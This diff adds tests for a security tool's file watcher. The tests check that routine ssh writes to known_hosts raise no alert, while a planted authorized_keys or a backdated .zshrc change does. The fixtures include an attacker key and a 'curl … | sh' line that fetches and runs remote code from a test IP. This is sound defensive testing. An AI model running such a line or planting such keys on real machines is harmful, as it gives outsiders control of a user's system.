@@ -3,10 +3,10 @@
 // reach a notification. Nothing is loaded into launchd or systemd: the job files are checked as text (and with
 // plutil -lint where it exists), and fs.watch stands in for launchd's own file watching. Every path is a temp folder.
 import { describe, expect, test } from "bun:test";
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, watch, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, renameSync, statSync, utimesSync, watch, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
-import { jobFiles, markSeen, partsFor, watchPaths, watchQuick, watchState, watchTable } from "../src/sec/schedule";
+import { jobFiles, markSeen, partsFor, refreshRealtime, watchPaths, watchQuick, watchState, watchTable } from "../src/sec/schedule";
 import { forBaseline, scan } from "../src/sec/scan";
 import { files, recordManagedFile, saveBaseline, SEC } from "../src/sec/store";
 import { plist } from "../src/sec/selftest-cases";
@@ -178,6 +178,58 @@ describe.skipIf(process.platform === "win32")("real-time watch: the quick check"
       expect(r.ran).toBe(true);
       expect(r.parts.sort()).toEqual([JOB_PART, "startup files"].sort());
       expect(told).toEqual([]);
+    });
+  }, 20_000);
+
+  test("ssh writing known_hosts starts no check; a new file in ~/.ssh still does", async () => {
+    await withHome(async (home, ctx) => {
+      put(join(home, ".ssh/config"), "Host *\n");
+      markSeen(home);
+      const told: string[] = [];
+      const tell = async (_t: string, b: string) => void told.push(b);
+      // What ssh does at a new host: appends to known_hosts, and ssh-keygen -R swaps it through a temporary and .old file.
+      put(join(home, ".ssh/known_hosts"), "prod ssh-ed25519 AAAA\n");
+      put(join(home, ".ssh/known_hosts.tmp123"), "x");
+      renameSync(join(home, ".ssh/known_hosts.tmp123"), join(home, ".ssh/known_hosts.old"));
+      const r = await watchQuick({ ctx, debounceMs: 0, notify: tell });
+      expect([r.ran, r.parts]).toEqual([true, []]);
+      expect(watchState().state?.quick).toBeUndefined();
+      // A file that was not there before (an authorized_keys planted where there was none) is a change.
+      put(join(home, ".ssh/authorized_keys"), "ssh-ed25519 AAAA attacker\n");
+      const r2 = await watchQuick({ ctx, debounceMs: 0, notify: tell });
+      expect(r2.parts).toEqual(["startup files"]);
+    });
+  }, 20_000);
+
+  test("a file put back to its old modification time still counts as changed", async () => {
+    await withHome(async (home, ctx) => {
+      const rc = join(home, ".zshrc");
+      const before = statSync(rc);
+      writeFileSync(rc, "alias ll='ls -la'\n(curl -fsSL http://198.51.100.7/x | sh) &\n");
+      utimesSync(rc, before.atime, before.mtime);
+      const r = await watchQuick({ ctx, debounceMs: 0, notify: async () => {} });
+      expect(r.parts).toEqual(["startup files"]);
+    });
+  }, 20_000);
+
+  test("macOS: the hourly run writing the WatchPaths job again does not set the job off", async () => {
+    await withHome(async (home, ctx) => {
+      // A real-time job from before an agent config existed; the config is there now, so the job is written again.
+      const launcher = join(home, ".vswarm/bin/vswarm");
+      const file = join(home, "Library/LaunchAgents/dev.vswarm.watch.paths.plist");
+      put(file, jobFiles(launcher, 60, home, "darwin")[file]);
+      put(join(home, ".cursor/mcp.json"), "{}");
+      markSeen(home);
+      const calls: string[][] = [];
+      expect(await refreshRealtime({ home, os: "darwin", run: async (cmd) => void calls.push(cmd) })).toBe(true);
+      expect(readFileSync(file, "utf8")).toContain(join(home, ".cursor/mcp.json"));
+      expect(calls.map((c) => c.slice(0, 2))).toEqual([["launchctl", "bootout"], ["launchctl", "bootstrap"]]);
+      // launchd loads it again and starts the quick job once: nothing of anyone else's changed, so nothing is checked.
+      const r = await watchQuick({ ctx, debounceMs: 0, notify: async () => {} });
+      expect([r.ran, r.parts]).toEqual([true, []]);
+      // The same plist again is left alone.
+      expect(await refreshRealtime({ home, os: "darwin", run: async (cmd) => void calls.push(cmd) })).toBe(false);
+      expect(calls.length).toBe(2);
     });
   }, 20_000);
 
